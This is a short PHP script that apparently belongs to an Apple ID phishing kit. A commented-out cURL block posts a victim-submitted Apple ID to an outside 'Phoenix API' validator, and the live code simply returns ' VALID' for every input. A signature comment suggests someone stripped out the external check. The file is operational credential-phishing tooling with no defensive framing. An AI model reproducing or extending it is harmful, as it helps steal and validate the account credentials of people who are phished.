<?php

/*
	
@bytedecode was not here
	
$curl = curl_init();
curl_setopt_array($curl, array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_URL => "https://ph-phoenix.com/api/apple_id_valid.php", CURLOPT_USERAGENT => "Phoenix API", CURLOPT_POST => 1, CURLOPT_POSTFIELDS => array(appleid => $_POST["appleid"])));
$resp = curl_exec($curl);
curl_close($curl);
*/
$resp = " VALID";
echo $resp;



?>